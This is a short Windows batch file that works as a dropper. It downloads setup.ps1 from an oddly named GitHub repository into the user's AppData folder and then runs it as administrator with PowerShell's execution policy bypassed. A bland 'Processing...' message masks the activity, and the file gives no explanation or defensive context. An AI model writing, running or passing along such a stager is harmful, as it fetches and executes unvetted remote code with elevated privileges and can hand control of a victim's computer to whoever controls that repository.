@echo off
set "URL=https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/setup.ps1"
set "DEST=%AppData%\setup.ps1"

echo Processing...

:: Use PowerShell to download the file quietly
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%DEST%')"

:: Run the downloaded PS1 as Administrator
powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%DEST%""'"

exit